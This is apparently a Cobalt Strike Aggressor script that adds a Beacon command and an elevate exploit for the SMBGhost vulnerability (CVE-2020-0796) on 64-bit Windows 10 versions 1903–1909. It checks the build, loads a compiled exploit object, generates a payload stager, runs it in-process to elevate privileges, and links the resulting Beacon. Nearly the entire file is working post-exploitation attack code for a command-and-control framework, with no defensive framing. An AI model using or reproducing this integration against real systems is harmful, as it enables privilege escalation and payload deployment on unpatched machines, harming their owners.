# an alternate path... run the exploit without the "weaponization" of injecting into winlogon.exe.
alias smbghost {
	local('$winbuild $handle $exploit');

	# check if we're on an x64 system and error out if we're not
	if (!-is64 $1) {
		berror($1, "cve-2020-0796 exploit is x64 only");
		return;
	}

	# check the windows version
	$winbuild = binfo($1, "build");
	if ($winbuild != 18362 && $winbuild != 18363) {
		berror($1, "This exploit only supports Windows 10 versions 1903 - 1909");
		return;
	}

	# acknowledge this command
	btask($1, "Task Beacon to elevate current process via cve-2020-0796", "T1068");

	# read in our BOF
	$handle  = openf(script_resource("exploit.x64.o"));
	$exploit = readb($handle, -1);
	closef($handle); 

	# spawn a Beacon post-ex job with the exploit DLL
	beacon_inline_execute($1, $exploit, "exploit_only", $null);
}

beacon_command_register("smbghost", 
			"Try to apply powerful privileges to current process token.", 
			"Synopsis: smbghost\n\nTry to apply powerful privileges to current process token. Try to inject or spawnu to an elevated process. This exploit may not succeed on the first try.");

# Integrate windows/local/cve_2020_0796_smbghost from Metasploit
# https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/cve_2020_0796_smbghost.rb
sub cve_2020_0796_exploit_bof {
	local('$stager $winbuild $handle $exploit');

	# check if we're on an x64 system and error out if we're not
	if (!-is64 $1) {
		berror($1, "cve-2020-0796 exploit is x64 only");
		return;
	}

	# check the windows version
	$winbuild = binfo($1, "build");
	if ($winbuild != 18362 && $winbuild != 18363) {
		berror($1, "This exploit only supports Windows 10 versions 1903 - 1909");
		return;
	}

	# note: this must be 0 or null. exploit will fail if compression is enabled.
	# reg queryv x64 HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters DisableCompression

	# acknowledge this command
	btask($1, "Task Beacon to run " . listener_describe($2) . " via cve-2020-0796", "T1068");

	# generate our shellcode
	$stager = payload_local($1, $2, "x64", "thread");

	# read in our BOF
	$handle  = openf(script_resource("exploit.x64.o"));
	$exploit = readb($handle, -1);
	closef($handle); 

	# spawn a Beacon post-ex job with the exploit DLL
	beacon_inline_execute($1, $exploit, "elevate", $stager);

	# link to our payload if it's a TCP or SMB Beacon
	beacon_link($1, $null, $2);
}

beacon_exploit_register("smbghost", "SMBv3 Compression Buffer Overflow (SMBGhost) (CVE 2020-0796) [BOF]", &cve_2020_0796_exploit_bof);
